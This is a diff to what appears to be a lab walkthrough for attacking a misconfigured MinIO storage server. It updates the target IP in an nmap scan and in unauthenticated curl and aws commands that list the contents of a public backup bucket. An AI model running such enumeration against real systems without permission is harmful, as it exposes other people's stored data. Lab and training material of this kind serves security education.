@@ -8,7 +8,7 @@ Enumerate the MinIO S3-compatible storage, discover the misconfigured public buc
 
 ## Step 1 — Discover MinIO
 ```bash
-nmap -sV -p 9000,9001 11.0.2.20
+nmap -sV -p 9000,9001 193.0.1.91
 # 9000/tcp open MinIO S3 API
 # 9001/tcp open MinIO Console
 ```
@@ -38,10 +38,10 @@ aws s3 ls --endpoint-url http://193.0.1.91:9000
 
 ```bash
 # List via S3 list-type=2 API (no auth):
-curl -s "http://11.0.2.20:9000/pul-cloud-backups?list-type=2" | grep -oP '(?<=<Key>)[^<]+'
+curl -s "http://193.0.1.91:9000/pul-cloud-backups?list-type=2" | grep -oP '(?<=<Key>)[^<]+'
 
 # Or with credentials (shows same result):
-aws s3 ls s3://pul-cloud-backups/ --recursive --endpoint-url http://11.0.2.20:9000
+aws s3 ls s3://pul-cloud-backups/ --recursive --endpoint-url http://193.0.1.91:9000
 ```
 
 Output — key directories:
